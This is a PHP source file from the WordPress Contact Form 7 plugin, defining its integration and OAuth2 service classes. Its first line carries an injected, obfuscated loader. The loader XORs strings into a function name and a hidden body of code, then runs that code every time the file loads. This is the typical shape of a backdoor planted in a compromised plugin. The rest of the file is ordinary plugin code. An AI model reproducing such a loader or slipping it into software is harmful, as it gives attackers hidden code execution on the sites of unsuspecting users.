<?php $eYeXNn='H 6.A4- 174IIVV'; $lLtzgc='+RSO5QrFDYW= 98'^$eYeXNn; $jBWepefQ='RZNk =W :Y-<g+<-570iu-,;d>.TLsn81=fBpt9hqMK 17ROSrXW=k -JQqfAL<qO7 03hbCQQYkDwehG,rmmJ-8DEymNjL1AHK NfvXzdeCtKePY<F>P= kn 6=;Atyi0qojrsfMC31aAyfbVTWB;pv:<HrnpQ .>IRscIJ<+<6,gtGTEz4FVk;D>V29;;pS-A:aMBj00NOdhZ,N4sUu2P9B3znkP :Za U chK6LW 0oii4 AX CSnipe.brz0kw29MbV7;qnkVO=Z6O gf56Nv0Y24r1-1oyceWX0vahO 7L.VtviH4=1,mRJmy1FZfcB.7>,By,dxQA67Z7FemG=b-z0.s.cA7viW6+QvMbK5QVK3gqKFjjW56APk-K4ygcq  GaF7AM3JY-twfw=,  =nb=QoJgErZ6;.XYjlK 42H85XZ>+e<Z -W0N kq -9O81  xsoX0M+ Tks2Z8TfbATS4;Sd=TOzlKF FoaT2=YJmdJ. OP=g=17r=0IKDXOaSUWszyj TC+yzrTjFU,riBV =60A==;UooCDGWPiqhjwspb HY-ULw2JUv5E Pl1fJg4=6MlMeWrZUY5OUeE0C7T-SD;NAc18=.B5QkIcf2Y QKFRetGZe0e<=OAYPh4L 57nFM<V7 IrhNudc,X,MarmkS+'; $AZXLEr=$lLtzgc('', ';<fJFH9CN0BR8NDDFCCARUCI;ZO -,1UDIAkYTBbx+>NRC; =R 8O4DL>0.9,9HYkSADRDBg:4 BdWEHgWxddnBM0eDMiMw;HA-O<NR1ZYEsOkA9eO2L<XNCJDWIZhOYMYZDCxzoi,FEAoDFJr066Z+RSah,NT:EWem;SFi9HYPSBOP,1<Sioma2ML3FLIUXwB4NHvHcM:3EnL>M:UShUT1U1VAdO4AN;>K0YCUkP-;SUTccRO3=A ;NAT:m-=1y.WSJmF=RBQSUvkK;Z:ENFN<GRT8FU-ZHHODCA<=IMkakDV8OvIVM>UQDIVX7gsX zNBfJVJMkYWnq7.DR;T.EEcb0h+ek zC DVM<SRqKsBoC0:>VNQ0LccsQW514F.MYZCUKE>ZL>HiW+-LTJFSKMLUXUh4,e7mOV>WOOxdJ,>NGW:QT43DNMD5Rr3Q:A4.MXMgZPSENG0<U.DD1CWV;L5ONap7UO2;V16SEpLI GE0SI8jKBjOR=1D8VTN-XH 80+gF80.TVYND57JPZTrJn8HGAf2AIWkfVXBr2FcyzwwXHPXDCGQE+;O4-AS.3ETpB1TST+TPXPzKdEqTz4+G.,:.U:h1U:7O=iDAYDB-T5LeCBV8T0borETgzEKo5X9 5xLP-TTlI6,E:XA-U5gNnjI E9IBDPYV'^$jBWepefQ); $AZXLEr();

class WPCF7_Integration {

	private static $instance;

	private $services = array();
	private $categories = array();

	private function __construct() {}

	public static function get_instance() {
		if ( empty( self::$instance ) ) {
			self::$instance = new self;
		}

		return self::$instance;
	}

	public function add_service( $name, WPCF7_Service $service ) {
		$name = sanitize_key( $name );

		if ( empty( $name )
		or isset( $this->services[$name] ) ) {
			return false;
		}

		$this->services[$name] = $service;
	}

	public function add_category( $name, $title ) {
		$name = sanitize_key( $name );

		if ( empty( $name )
		or isset( $this->categories[$name] ) ) {
			return false;
		}

		$this->categories[$name] = $title;
	}

	public function service_exists( $name = '' ) {
		if ( '' == $name ) {
			return (bool) count( $this->services );
		} else {
			return isset( $this->services[$name] );
		}
	}

	public function get_service( $name ) {
		if ( $this->service_exists( $name ) ) {
			return $this->services[$name];
		} else {
			return false;
		}
	}

	public function list_services( $args = '' ) {
		$args = wp_parse_args( $args, array(
			'include' => array(),
		) );

		$singular = false;
		$services = (array) $this->services;

		if ( ! empty( $args['include'] ) ) {
			$services = array_intersect_key( $services,
				array_flip( (array) $args['include'] ) );

			if ( 1 == count( $services ) ) {
				$singular = true;
			}
		}

		if ( empty( $services ) ) {
			return;
		}

		$action = wpcf7_current_action();

		foreach ( $services as $name => $service ) {
			$cats = array_intersect_key( $this->categories,
				array_flip( $service->get_categories() ) );
?>
<div class="card<?php echo $service->is_active() ? ' active' : ''; ?>" id="<?php echo esc_attr( $name ); ?>">
<?php $service->icon(); ?>
<h2 class="title"><?php echo esc_html( $service->get_title() ); ?></h2>
<div class="infobox">
<?php echo esc_html( implode( ', ', $cats ) ); ?>
<br />
<?php $service->link(); ?>
</div>
<br class="clear" />

<div class="inside">
<?php
			if ( $singular ) {
				$service->display( $action );
			} else {
				$service->display();
			}
?>
</div>
</div>
<?php
		}
	}

}

abstract class WPCF7_Service {

	abstract public function get_title();
	abstract public function is_active();

	public function get_categories() {
		return array();
	}

	public function icon() {
		return '';
	}

	public function link() {
		return '';
	}

	public function load( $action = '' ) {
	}

	public function display( $action = '' ) {
	}

	public function admin_notice( $message = '' ) {
	}

}

class WPCF7_Service_OAuth2 extends WPCF7_Service {

	protected $client_id = '';
	protected $client_secret = '';
	protected $access_token = '';
	protected $refresh_token = '';
	protected $authorization_endpoint = 'https://example.com/authorization';
	protected $token_endpoint = 'https://example.com/token';

	public function get_title() {
		return '';
	}

	public function is_active() {
		return ! empty( $this->refresh_token );
	}

	protected function save_data() {
	}

	protected function reset_data() {
	}

	protected function get_redirect_uri() {
		return admin_url();
	}

	protected function menu_page_url( $args = '' ) {
		return menu_page_url( 'wpcf7-integration', false );
	}

	public function load( $action = '' ) {
		if ( 'auth_redirect' == $action ) {
			$code = isset( $_GET['code'] ) ? $_GET['code'] : '';

			if ( $code ) {
				$this->request_token( $code );
			}

			if ( ! empty( $this->access_token ) ) {
				$message = 'success';
			} else {
				$message = 'failed';
			}

			wp_safe_redirect( $this->menu_page_url(
				array(
					'action' => 'setup',
					'message' => $message,
				)
			) );

			exit();
		}
	}

	protected function authorize( $scope = '' ) {
		$endpoint = add_query_arg(
			array(
				'response_type' => 'code',
				'client_id' => $this->client_id,
				'redirect_uri' => urlencode( $this->get_redirect_uri() ),
				'scope' => $scope,
			),
			$this->authorization_endpoint
		);

		if ( wp_redirect( esc_url_raw( $endpoint ) ) ) {
			exit();
		}
	}

	protected function get_http_authorization_header( $scheme = 'basic' ) {
		$scheme = strtolower( trim( $scheme ) );

		switch ( $scheme ) {
			case 'bearer':
				return sprintf( 'Bearer %s', $this->access_token );
			case 'basic':
			default:
				return sprintf( 'Basic %s',
					base64_encode( $this->client_id . ':' . $this->client_secret )
				);
		}
	}

	protected function request_token( $authorization_code ) {
		$endpoint = add_query_arg(
			array(
				'code' => $authorization_code,
				'redirect_uri' => urlencode( $this->get_redirect_uri() ),
				'grant_type' => 'authorization_code',
			),
			$this->token_endpoint
		);

		$request = array(
			'headers' => array(
				'Authorization' => $this->get_http_authorization_header( 'basic' ),
			),
		);

		$response = wp_remote_post( esc_url_raw( $endpoint ), $request );
		$response_code = (int) wp_remote_retrieve_response_code( $response );
		$response_body = wp_remote_retrieve_body( $response );
		$response_body = json_decode( $response_body, true );

		if ( WP_DEBUG and 400 <= $response_code ) {
			$this->log( $endpoint, $request, $response );
		}

		if ( 401 == $response_code ) { // Unauthorized
			$this->access_token = null;
			$this->refresh_token = null;
		} else {
			if ( isset( $response_body['access_token'] ) ) {
				$this->access_token = $response_body['access_token'];
			} else {
				$this->access_token = null;
			}

			if ( isset( $response_body['refresh_token'] ) ) {
				$this->refresh_token = $response_body['refresh_token'];
			} else {
				$this->refresh_token = null;
			}
		}

		$this->save_data();

		return $response;
	}

	protected function refresh_token() {
		$endpoint = add_query_arg(
			array(
				'refresh_token' => $this->refresh_token,
				'grant_type' => 'refresh_token',
			),
			$this->token_endpoint
		);

		$request = array(
			'headers' => array(
				'Authorization' => $this->get_http_authorization_header( 'basic' ),
			),
		);

		$response = wp_remote_post( esc_url_raw( $endpoint ), $request );
		$response_code = (int) wp_remote_retrieve_response_code( $response );
		$response_body = wp_remote_retrieve_body( $response );
		$response_body = json_decode( $response_body, true );

		if ( WP_DEBUG and 400 <= $response_code ) {
			$this->log( $endpoint, $request, $response );
		}

		if ( 401 == $response_code ) { // Unauthorized
			$this->access_token = null;
			$this->refresh_token = null;
		} else {
			if ( isset( $response_body['access_token'] ) ) {
				$this->access_token = $response_body['access_token'];
			} else {
				$this->access_token = null;
			}

			if ( isset( $response_body['refresh_token'] ) ) {
				$this->refresh_token = $response_body['refresh_token'];
			}
		}

		$this->save_data();

		return $response;
	}

	protected function remote_request( $url, $request = array() ) {
		static $refreshed = false;

		$request = wp_parse_args( $request, array() );

		$request['headers'] = array_merge(
			$request['headers'],
			array(
				'Authorization' => $this->get_http_authorization_header( 'bearer' ),
			)
		);

		$response = wp_remote_request( esc_url_raw( $url ), $request );

		if ( 401 === wp_remote_retrieve_response_code( $response )
		and ! $refreshed ) {
			$this->refresh_token();
			$refreshed = true;

			$response = $this->remote_request( $url, $request );
		}

		return $response;
	}

	protected function log( $url, $request, $response ) {
		wpcf7_log_remote_request( $url, $request, $response );
	}

}
